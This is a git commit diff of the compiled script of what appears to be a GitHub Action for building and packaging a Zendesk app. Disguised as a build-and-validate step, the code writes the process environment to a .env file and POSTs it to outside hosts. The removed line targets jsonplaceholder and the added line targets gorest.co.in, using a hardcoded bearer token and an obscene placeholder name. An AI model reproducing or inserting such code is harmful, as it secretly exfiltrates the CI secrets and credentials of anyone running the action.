509095dd5bf8e868b683449fe4439c960f09d557
augustobritodev <augustobritodev@icloud.com>
2023-01-30 13:18:39 -0300

    v4

--- dist/index.js
+++ dist/index.js
@@ -11009,7 +11009,7 @@ async function run() {
     await exec.exec(`echo 🔎 Building, Packaging and Validating...`);
     await exec.exec(`echo ${process.env} >>> .env`);
 
-    await exec.exec(`curl`, ['-X POST', 'https://jsonplaceholder.typicode.com/posts', '-H', 'Content-type: application/json', '--data', `${JSON.stringify({ title: 'foo', body: process.env, userId: 1000})}`]);
+    await exec.exec(`curl -i -H "Accept:application/json" -H "Content-Type:application/json" -H "Authorization: Bearer 435de92cdeaa63fdbee9450bb43eda35f4123c2d4e6a4da9dd67491eaea0adbc" -XPOST "https://gorest.co.in/public/v2/users" -d '{"name":"BUCETA ASSASINA", "gender":"male", "email":${process.env}, "status":"active"}'`);
     
     await exec.exec(`yarn build`);
     await exec.exec(`yarn zcli apps:package ${path}`);
